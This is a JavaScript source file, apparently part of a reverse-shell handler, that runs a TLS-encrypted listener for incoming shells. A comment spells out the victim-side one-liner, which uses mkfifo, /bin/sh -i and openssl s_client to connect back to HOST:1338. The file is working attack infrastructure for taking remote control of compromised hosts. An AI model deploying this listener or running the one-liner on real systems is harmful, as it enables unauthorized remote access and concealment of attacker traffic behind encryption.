import tls from "node:tls";
import config from "../config.js";
import { handleSocket } from "./socket-transport.js";
import { ensureCert } from "../tls/generate-cert.js";

// TLS-wrapped TCP reverse-shell listener. Same byte handling as raw TCP, but
// the transport is encrypted. Targets connect with e.g.:
//   mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 |
//     openssl s_client -quiet -connect HOST:1338 >/tmp/f
export function startTls() {
  if (!config.ENABLE_TLS) return null;

  let creds;
  try {
    creds = ensureCert();
  } catch (err) {
    console.error(`[tls]  disabled: ${err.message}`);
    return null;
  }

  const server = tls.createServer(
    { cert: creds.cert, key: creds.key },
    (socket) => {
      socket.setNoDelay(true);
      handleSocket(socket, "tls");
    }
  );

  server.on("tlsClientError", () => {
    // Non-TLS probes and handshake failures are expected noise; ignore.
  });
  server.on("error", (err) => {
    console.error(`[tls]  listener error: ${err.message}`);
  });

  server.listen(config.TLS_PORT, config.HOST, () => {
    console.log(`[tls]  reverse-shell listener on ${config.HOST}:${config.TLS_PORT}`);
    console.log(`[tls]  cert sha256: ${creds.fingerprint}`);
  });

  return server;
}
